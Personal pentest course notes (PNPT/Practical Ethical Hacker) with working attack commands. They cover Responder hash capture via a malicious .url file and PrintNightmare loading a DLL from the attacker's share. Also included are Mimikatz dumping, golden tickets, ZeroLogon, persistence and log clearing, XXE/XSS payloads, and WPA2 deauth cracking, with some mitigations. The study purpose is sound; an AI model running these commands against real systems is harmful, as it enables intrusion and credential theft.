<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; auxiliary/smb_enum_gpp
</code></pre></div></div>

<h4 id="tips">tips</h4>
<p>in smb:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prompt off
recurse on
mget *

in Wserver2012&lt; -Found Groups.xml
Get the cpassword
gpp-decrypt &lt;cpassword&gt;
</code></pre></div></div>

<h3 id="url-file-attacks">URL File Attacks</h3>

<ul>
  <li>name it with ‘@something.url’</li>
  <li>and place it in a share folder, or whatever place to people to click and redirect to our machine</li>
  <li>so we can grab with responder</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>InternetShortcut]
<span class="nv">URL</span><span class="o">=</span>blah
<span class="nv">WorkingDirectory</span><span class="o">=</span>blah
<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>&lt;kali ip&gt;<span class="se">\%</span>USERNAME%.icon
<span class="nv">IconIndex</span><span class="o">=</span>1

<span class="c"># Getting Hash</span>
responder <span class="nt">-I</span> eth0 <span class="nt">-v</span>
</code></pre></div></div>

<blockquote>
  <p>you dont even need to open the file, just go to the directory of the file and we have access from responder</p>
</blockquote>

<h3 id="printnightmare-cve-2021-1675">PrintNightmare (CVE-2021-1675)</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/cube0x0/CVE-2021-1675
https://github.com/calebstewart/CVE-2021-1675
</code></pre></div></div>

<p>To test if its vulnerable:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run rpcdump.py @&lt;dc ip&gt; | egrep 'MS-RPRN|MSPAR'
</code></pre></div></div>

<ul>
  <li>Install the last version of impacket</li>
  <li>grab the code and save in somethin.py</li>
</ul>

<h4 id="the-attack">The Attack</h4>
<p><strong>Step 1</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set mfvenom -o shell.dll
</code></pre></div></div>

<p><strong>Step 5</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set msfconsole
</code></pre></div></div>

<p><strong>Step 3</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py share 'pwd' -smb2support
</code></pre></div></div>

<p><strong>Step 4</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Example:
./CVE-2021-1675.py hackit.local/domain_user:Pass123@&lt;dc ip&gt; '\\&lt;kali ip&gt;\share\shell.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@&lt;dc ip&gt;  'C:\shell.dll'
</code></pre></div></div>

<h4 id="mitigation-1">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Disable Spooler service
</code></pre></div></div>

<h3 id="mimikatz">Mimikatz</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Tools used to view and steal credentials, generate kerberos tickets and leverage attacks
- dumps credentials stored in memory
- just a few attacks:
- credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket
</code></pre></div></div>

<p>→ https://github.com/gentilkiwi/mimikatz</p>

<p>Run in the DC:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam /patch
lsadump::lsa /patch = lsa (local security authority)
# ntds.dit = contains all the credentials aswell
</code></pre></div></div>

<h4 id="golden-ticket">Golden ticket</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt

# in the output:
# grab the SID of the domain
# grab the NTLM hash of the TGT account

kerberos::golden /User:Administrator /domain:mk.local /sid:&lt;SID&gt; /krbtgt:&lt;NTLM hash&gt; /id:500 /ptt
# ptt = pass the ticket

misc::cmd = to get a shell
</code></pre></div></div>

<blockquote>
  <p>after that we can <strong>psexec.exe</strong> and dominate all the DC network</p>
</blockquote>

<h3 id="zerologon-cve-2020-1472">ZeroLogon (CVE-2020-1472)</h3>

<p>→ https://github.com/dirkjanm/CVE-2020-1472</p>

<p>→ https://github.com/SecuraBV/CVE-2020-1472</p>

<h4 id="checker">Checker</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 zerologon_check.py &lt;domain controller&gt; &lt;target ip&gt;
</code></pre></div></div>

<p>If it shows -&gt; Success DC can be fully compromised by a ZeroLogon</p>

<blockquote>
  <p>we can print and show to the client, without the need to execute the exploit. 
Cause sets the credentials of DC to NULL, so we need to restore after, not worth the risk</p>
</blockquote>

<h4 id="attack">Attack</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 cve-2020-1472-exploit.py &lt;domain controller&gt; &lt;target ip&gt;
secretsdump.py <span class="nt">-just-dc</span> &lt;domain/DC<span class="se">\$</span>@IP&gt;
</code></pre></div></div>

<h4 id="restore">Restore</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py administrator@&lt;target ip&gt; <span class="nt">-hash</span> &lt;administrator full <span class="nb">hash</span><span class="o">&gt;</span>
found the plain_password_hex <span class="o">&gt;</span> copy the <span class="nb">hash </span>that is <span class="k">in </span>front
python3 restorepassword.py &lt;domain/DC@DC&gt; <span class="nt">-target-ip</span> &lt;ip&gt; <span class="nt">-hexpass</span> &lt;<span class="nb">paste </span>the <span class="nb">hash </span>of plain_pwd_hex&gt;
</code></pre></div></div>

<h1 id="post-exploitation">Post Exploitation</h1>

<h2 id="file-transfer-review">File Transfer Review</h2>

<p>Certutil:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -urlcache -f http://&lt;ip&gt;/file.txt output_file.txt
</code></pre></div></div>

<p>HTTP:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
python <span class="nt">-m</span> SimpleHTTPServer
</code></pre></div></div>

<p>Browser:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Navigate directly to file
</code></pre></div></div>

<p>FTP:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> pyftpdlib 21 &lt;kali ip&gt;
ftp &lt;kali ip&gt;
</code></pre></div></div>

<p>Linux:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;ip&gt;:&lt;port&gt;/file
</code></pre></div></div>

<p>Metasploit:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Has download and upload features to transfer files
</code></pre></div></div>

<h2 id="maintaining-access">Maintaining Access</h2>

<h3 id="with-metasploit">With Metasploit</h3>
<p>Persistence Scripts:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run persistence <span class="nt">-h</span>
exploit/windows/local/persistence
exploit/windows/local/registry_persistence
</code></pre></div></div>

<p>Scheduled Tasks:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run scheduleme
run schtaskabuse
</code></pre></div></div>

<p>Add a User:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="nx">password123</span><span class="w"> </span><span class="nx">/add</span><span class="w">
</span></code></pre></div></div>

<h3 id="pivoting">Pivoting</h3>
<p>Lab setup:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Shutdown the w10 machines
- go to virtual network editor em vmware
- change settings &gt; add network &gt; set up a range like 10.10.10.0/24
- edit virtual machine settings &gt; add a network adapter &gt; put the new network in the second adapter
- in the 2nd w10 machine &gt; just change the net adapter to the new network
</code></pre></div></div>

<blockquote>
  <p>[RECAP] One machine will have dual net adapter</p>
</blockquote>

<blockquote>
  <p>The second one gonna stay just in the new network - 10.10.10.0</p>
</blockquote>

<blockquote>
  <p>Both w10 machines will ping each other, our kali should ping just one</p>
</blockquote>

<h4 id="metasploit-1">Metasploit</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/smb/psexec <span class="c"># enter in the machine that has 2 net adapters</span>
route print or ipconfig <span class="c"># to show the network config</span>
arp <span class="nt">-a</span> <span class="c"># to show the established connections</span>
run autoroute <span class="nt">-s</span> 10.10.10.0/24
run autoroute <span class="nt">-p</span> <span class="c"># to list all active routes</span>
background

<span class="c"># we can search portscan &gt; tcp or whatever</span>
</code></pre></div></div>

<h3 id="cleanup">Cleanup</h3>
<p>Make the system/network as it was when you entered it:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- remove executables, scripts and added files
- remove malware, rootkits and added user accounts
- set settings back to original configurations
</code></pre></div></div>

<blockquote>
  <p>Make it look like you were never there
clear logs, traces etc</p>
</blockquote>

<h1 id="web-application">Web Application</h1>

<p>To install GO and other useful tools:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/Dewalt-arch/pimpmykali 
</code></pre></div></div>

<h2 id="web-application-enumeration">Web Application Enumeration</h2>

<h3 id="assetfinder">Assetfinder</h3>
<p>To install:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># go get -u github.com/tomnomnom/assetfinder</span>

assetfinder &lt;domain&gt;
assetfinder <span class="nt">--subs-only</span> &lt;domain&gt;
</code></pre></div></div>

<blockquote>
  <p>This script will sort only the subdomains that contains our target</p>
</blockquote>

<p>create run.sh:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c">#!/bin/bash</span>

<span class="nv">url</span><span class="o">=</span><span class="nv">$1</span>

<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$url</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">mkdir</span> <span class="nv">$url</span>
<span class="k">fi

if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$url</span><span class="s2">/recon"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">mkdir</span> <span class="nv">$url</span>/recon
<span class="k">fi

</span><span class="nb">echo</span> <span class="s2">"[+] Harvesting subdomains with assetfinder..."</span>
assetfinder <span class="nv">$url</span> <span class="o">&gt;&gt;</span> <span class="nv">$url</span>/recon/assets.txt
<span class="nb">cat</span> <span class="nv">$url</span>/recon/assets.txt | <span class="nb">grep</span> <span class="nv">$1</span> <span class="o">&gt;&gt;</span> <span class="nv">$url</span>/recon/final.txt
<span class="nb">rm</span> <span class="nv">$url</span>/recon/assets.txt

</code></pre></div></div>

<h3 id="amass">Amass</h3>
<p>https://github.com/OWASP/Amass</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># go get -v github.com/OWASP/Amass/v3/...</span>

amass enum <span class="nt">-d</span> &lt;domain&gt;
</code></pre></div></div>

<p>Add to the script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"[+] Harvesting subdomains with Amass..."</span>
amass enum <span class="nt">-d</span> <span class="nv">$url</span> <span class="o">&gt;&gt;</span> <span class="nv">$url</span>/recon/f.txt
<span class="nb">sort</span> <span class="nt">-u</span> <span class="nv">$url</span>/recon/f.txt <span class="o">&gt;&gt;</span> <span class="nv">$url</span>/recon/final.txt
<span class="nb">rm</span> <span class="nv">$url</span>/recon/f.txt
</code></pre></div></div>

<h3 id="httprobe">Httprobe</h3>
<p>→ https://github.com/tomnomnom/httprobe</p>

<p>It tests the list to see which one is up:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># go get -u github.com/tomnomnom/httprobe</span>

<span class="nb">cat</span> &lt;file of subdomains&gt; | httprobe <span class="nt">-s</span> <span class="nt">-p</span> https:443
</code></pre></div></div>

<p>add to the script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"[+] Probing for alive domains..."</span>
<span class="nb">cat</span> <span class="nv">$url</span>/recon/final.txt | <span class="nb">sort</span> <span class="nt">-u</span> | httprobe <span class="nt">-s</span> <span class="nt">-p</span> https:443 | <span class="nb">sed</span> <span class="s1">'s/https\?:\/\////'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">':443'</span> <span class="o">&gt;&gt;</span> <span class="nv">$url</span>/recon/alive.txt
</code></pre></div></div>

<h3 id="gowitness">GoWitness</h3>
<p>→ https://github.com/sensepost/gowitness</p>

<p>Takes screenshot of a webpage:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># go get -u gorm.io/gorm = dependencies
# go get -u github.com/sensepost/gowitness
# gowitness single https://&lt;domain&gt;

cd screenshots/
</code></pre></div></div>

<h4 id="tcm-full-script-for-subdomain-enumeration">tcm full script for subdomain enumeration</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://pastebin.com/MhE6zXVt
</code></pre></div></div>

<h4 id="additionalresources">Additional Resources</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.youtube.com/watch?v=uKWu6yhnhbQ
https://www.youtube.com/watch?v=MIujSpuDtFY&amp;list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA
</code></pre></div></div>

<h2 id="testing-owasp-top-10">Testing OWASP Top 10</h2>

<p>https://owasp.org/Top10/</p>

<ul>
  <li>checklist: https://github.com/tanprathan/OWASP-Testing-Checklist</li>
</ul>

<h3 id="juice-shop">Juice Shop</h3>
<p>its a vulnerable website made by owasp:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/juice-shop/juice-shop
https://pwning.owasp-juice.shop/
</code></pre></div></div>

<p>We can install locally with docker or just access the thm room:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://tryhackme.com/room/owaspjuiceshop
</code></pre></div></div>

<h4 id="install-foxy-proxy">Install Foxy Proxy</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extension in firefox to change proxy easyly
https://addons.mozilla.org/pt-BR/firefox/addon/foxyproxy-standard/
</code></pre></div></div>

<h4 id="burpsuite">BurpSuite</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxy &gt; options &gt; intercept client/server requests &gt; enable -- Is in targe scope
</code></pre></div></div>

<blockquote>
  <p>Everything else its not new. so i will pass for now, cause i used burp a lot in ctfs.</p>
</blockquote>

<h3 id="sql-injection">SQL Injection</h3>
<p>Is an attack in which malicious SQL statements are injected into a SQL database</p>

<h4 id="overview">Overview</h4>
<p>SQL Verbs:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT, INSERT, DELETE, UPDATE, DROP, UNION
</code></pre></div></div>
<p>Common Terms:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WHERE, AND/OR/NOT, ORDER BY
</code></pre></div></div>

<p>Special Chars:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">'</span><span class="s">  </span><span class="sh">'</span><span class="ow">and</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span> <span class="o">=</span> <span class="n">string</span> <span class="n">delimiters</span>
<span class="o">--</span><span class="p">,</span> <span class="o">/*</span><span class="p">,</span> <span class="c1"># = comment delimiters
</span><span class="o">*</span><span class="p">,</span> <span class="o">%</span> <span class="o">=</span> <span class="n">wildcards</span>
<span class="p">;</span> <span class="o">=</span> <span class="n">end</span> <span class="n">sql</span> <span class="n">statement</span>
<span class="o">=</span><span class="p">,</span> <span class="o">+</span><span class="p">,</span><span class="o">&lt;</span><span class="p">,</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">logic</span>
</code></pre></div></div>

<h4 id="mitigation-2">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Parameterized Statements:
# Good example: "SELECT * FROM users WHERE email =?";
# Bad example: "SELECT * FROM users WHERE email = '+email+'";

- Sanitizing Input
</code></pre></div></div>

<h3 id="broken-authentication">Broken Authentication</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Permits brute force or other automated attacks
Permits default, weak or well-known passwords
</code></pre></div></div>

<ul>
  <li>look for token session</li>
  <li>default credentials</li>
  <li>possibility to brute force</li>
</ul>

<h3 id="mitigation-3">Mitigation</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Implement MFA
- Do not ship or deploy any default credentials
- Implement weak-password checks
</code></pre></div></div>

<h3 id="sensitive-data-exposure">Sensitive Data Exposure</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clear text data
without criptography
</code></pre></div></div>

<h4 id="mitigation-4">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Make sure you data is encripted 
- Dont share unnecessary data
- Strong passords
</code></pre></div></div>

<h4 id="discover">Discover</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># To discover files that not should have been exposed first of all we need a good enumeration
# Find directories with web crawling: gobuster, dirb, dirsearch, ffuf, etc
# Dig in responses of the requests in burp
# Scan headers with: https://securityheaders.com/

nmap --script=ssl-enum-ciphers -p 443 &lt;domain&gt;
</code></pre></div></div>

<h3 id="xml-external-entities">XML External Entities</h3>
<p>Attack systems that parse XML imput</p>

<p>example.xml</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
  <span class="cp">&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo any &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span> ]&gt; <span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</code></pre></div></div>

<h4 id="mitigation-5">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Disable the external entities in XML files
</code></pre></div></div>

<h3 id="broken-access-control">Broken Access Control</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User get access to somewhere they should not
example: access an admin panel without the credentials
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Bypass broken access in inspect element, delete hidden=""
- Change type: password to type: text to show passwords in clear text
</code></pre></div></div>

<h3 id="security-misconfiguration">Security Misconfiguration</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Default credentials
Improperly configured permissions
Unnecessary features, ports, services, pages, accounts, etc
</code></pre></div></div>

<h4 id="mitigation-6">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Security Headers
- ACLs
- Do not have any unnecessary features, components, etc
</code></pre></div></div>

<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>

<p>Reflected:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>after inserting something malicious, its gonna reflect back to us
example &lt;script&gt; alert(0) &lt;/script&gt;
</code></pre></div></div>

<p>Stored:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The malicious code gets stored into the server
</code></pre></div></div>

<p>DOM:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Document object model - javascript
its client side like reflected xss.
example: &lt;iframe src="javascript:alert('xss')"&gt;
</code></pre></div></div>

<h4 id="mitigation-7">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Encoding: '&lt;' becomes &amp;lt;  &lt;script&gt; becomes &amp;lt;script&gt;
- Filtering: &lt;script&gt; becomes script
- Validating: compare input against white list
- Sanitization: combination of escaping, filtering and validation
</code></pre></div></div>

<h3 id="insecure-deserialization">Insecure Deserialization</h3>
<p>We can send malicious data serialized and the application will deserialize and execute</p>

<h4 id="mitigation-8">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Monitoring deserialization
- Enforcing strict type contraints during deserialization
- Implement digital signatures 
</code></pre></div></div>

<h3 id="using-components-with-known-vulnerabilities">Using components with Known vulnerabilities</h3>
<p>Using out-dated applications, unsupported or vulnerable</p>

<h4 id="mitigation-9">Mitigation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Update old applications, services, etc
- Keep inventory of versions of both client-side and server-side components
- Remove unused dependencies, unnecessary features, components, files and documentation

</code></pre></div></div>

<h3 id="insufficient-logging-and-monitoring">Insufficient Logging and Monitoring</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Auditable events, such as logins, failed logins
uncler logs
unable to detect or alert for active attacks in real time or near real time
</code></pre></div></div>

<h3 id="mitigation-10">Mitigation</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Ensure all login, access control failures and server-side input validation
- Ensure that logs are generated in a format that can be easily consumed
- Establish effective monitoring and alerting suspicious activities 
- Establish an incident responde and recovery plan
</code></pre></div></div>

<h1 id="wireless-penetration-testing">Wireless Penetration Testing</h1>

<h2 id="assessment-of-wireless-network">Assessment of wireless network</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WPA2 PSK (pre share key)
WPA2 Enterprise
</code></pre></div></div>

<h3 id="activities-performed">Activities performed</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Evaluating strength of PSK
Reviewing nearby networks
Assessing guest networks
Checking network access
</code></pre></div></div>

<h3 id="tools">Tools</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Wireless card
Router
Laptop
</code></pre></div></div>

<h3 id="process-of-attack---wpa2-psk">Process of attack - WPA2 PSK</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Place &gt; Discover &gt; Select &gt; Perform &gt; Capture &gt; Attemp

- Place wireless card into monitor mode
- Discover information about network 
	channel / BSSID (mac address)

- Select network and capture data
- Perform deauth attack
- Capture WPA handshake
- Attemp to crack the handshake
</code></pre></div></div>

<h2 id="wpa_ps2_exploit">WPA_PS2_Exploit</h2>

<p>Connect the wireless card:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if you are using VM
  Player &gt; removable devices &gt; card &gt; connect
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iwconfig <span class="c"># to show wireless connections</span>
airmon-ng check <span class="nb">kill</span> <span class="c"># check and kill processes that will interfere in our scope</span>
airnon-ng start wlan0 <span class="c"># start monitor mode</span>
airodump-ng wlan0mon <span class="c"># to show possible targets in the area</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID # mac address of the access point
PWR # power level, lower the number close we are to the device
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng -c &lt;channel&gt; --bssid &lt;mac address of target&gt; -w &lt;file name&gt; wlan0mon (our w_interface)
</code></pre></div></div>

<blockquote>
  <p>now we wait for the WPA handshake, we can accelerate this proccess by deauth the users from their network</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng -0 (means deauth) 1 (number of times we are gonna run) -a &lt;mac address of target&gt; -c &lt;station mac address&gt; wlan0mon (our interface)
</code></pre></div></div>

<blockquote>
  <p>sometimes its necessary to run a couple of times, against differents users</p>
</blockquote>

<p>After getting the WPA handshake:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls </span>capture<span class="k">*</span>
	show the .cap file
</code></pre></div></div>

<h3 id="crack-the-handshake-wpa">crack the handshake wpa:</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng <span class="nt">-w</span> &lt;wordlist&gt; <span class="nt">-b</span> &lt;mac address of target&gt; &lt;the .cap file&gt;
<span class="c"># we can try to crack with hashcat too</span>
</code></pre></div></div>

<h1 id="report">Report</h1>

<h2 id="common-legal-documents">Common Legal Documents</h2>

<p>Sales:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mutual Non-Disclosure Agreement (NDA)
Master Service Agreement (MSA)
Statement of Work (SOW)
Other: Sample Report, Recommendation Letters, etc
</code></pre></div></div>

<p>Before you Test:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rules of Engagement (ROE)
</code></pre></div></div>

<p>After you Test:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Findings Report
</code></pre></div></div>

<h2 id="pentest-report-writing">Pentest Report Writing</h2>

<p>→ https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report</p>

<p>→ https://tcm-sec.com/wp-content/uploads/2021/10/TCMS-Demo-Corp-Security-Assessment-Findings-Report.pdf</p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">bof</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#recon" class="page__taxonomy-item" rel="tag">recon</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#pnpt" class="page__taxonomy-item" rel="tag">pnpt</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-25T00:00:00+06:00">November 25, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=1+-+Practical+Ethical+Hacker%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fpeh%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fpeh%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fpnpt%2Fpeh%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/review/pnpt/" class="pagination--pager" title="Practical Network Penetration Tester
">Previous</a>
    
    
      <a href="/notes/pnpt/osint/" class="pagination--pager" title="2 - Open-Source Intelligence (OSINT)
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
